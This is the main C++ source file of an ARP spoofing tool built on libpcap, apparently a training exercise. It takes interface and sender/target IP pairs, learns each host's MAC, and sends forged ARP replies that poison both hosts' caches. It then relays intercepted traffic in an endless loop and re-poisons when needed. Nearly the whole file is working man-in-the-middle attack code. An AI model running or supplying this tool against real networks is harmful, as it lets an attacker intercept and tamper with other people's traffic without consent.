#include "main.h"

void usage() {
	printf("syntax: arp-spoof <interface> <sendIP> <targetIP> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    Spoof spoof;

    if (argc < 2 || argc % 2 != 0) {
		usage();
		return EXIT_FAILURE;
	}

    char* dev = argv[1];
    
    //Attacker Mac
    Mac attackerMac = spoof.GetAttackerMac(dev);
    //Attacker IP
    Ip attackerIP = spoof.GetAttackerIP(dev);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);


    for (int i=2; i < argc; i+=2) {
        spoof.SetSendnTargetIp(argv[i], argv[i+1]);
        
        EthArpPacket packet;
        spoof.SetDefaultArpPacket(packet);

        /* 코드 중복 많음, 나중에 수정하기*/
        //sender 
		spoof.SetPacket(packet, Mac("FF:FF:FF:FF:FF:FF"), attackerMac, ArpHdr::Request, attackerIP, Mac("00:00:00:00:00:00"), spoof.senderIP_);
		const u_char* p1= reinterpret_cast<const u_char*>(&packet);
        spoof.SendPacket(pcap, p1, sizeof(packet));
        spoof.GetSrcMac(pcap, "Sender");

        //target
		spoof.SetPacket(packet, Mac("FF:FF:FF:FF:FF:FF"), attackerMac, ArpHdr::Request, attackerIP, Mac("00:00:00:00:00:00"), spoof.targetIP_);
		const u_char* p2= reinterpret_cast<const u_char*>(&packet);
        spoof.SendPacket(pcap, p2, sizeof(packet));
        spoof.GetSrcMac(pcap, "Target");
        
        //Send ARP Infection
        spoof.SetPacket(packet, spoof.senderMac_, attackerMac, ArpHdr::Reply, spoof.targetIP_, spoof.senderMac_, spoof.senderIP_);
		const u_char* p3= reinterpret_cast<const u_char*>(&packet);
        spoof.SendPacket(pcap, p3, sizeof(packet));

        //Target ARP Infection
        spoof.SetPacket(packet, spoof.targetMac_, attackerMac, ArpHdr::Reply, spoof.senderIP_, spoof.targetMac_, spoof.targetIP_);
        const u_char* p4= reinterpret_cast<const u_char*>(&packet);
        spoof.SendPacket(pcap, p4, sizeof(packet));

        while (1) {
            if (spoof.RelayPacket(pcap, attackerMac, attackerIP)) {
                        //Send ARP Infection
                spoof.SetPacket(packet, spoof.senderMac_, attackerMac, ArpHdr::Reply, spoof.targetIP_, spoof.senderMac_, spoof.senderIP_);
                const u_char* p3= reinterpret_cast<const u_char*>(&packet);
                spoof.SendPacket(pcap, p3, sizeof(packet));

                //Target ARP Infection
                spoof.SetPacket(packet, spoof.targetMac_, attackerMac, ArpHdr::Reply, spoof.senderIP_, spoof.targetMac_, spoof.targetIP_);
                const u_char* p4= reinterpret_cast<const u_char*>(&packet);
                spoof.SendPacket(pcap, p4, sizeof(packet));
            }
        }
        


        
    }

    pcap_close(pcap);

    return 0;
}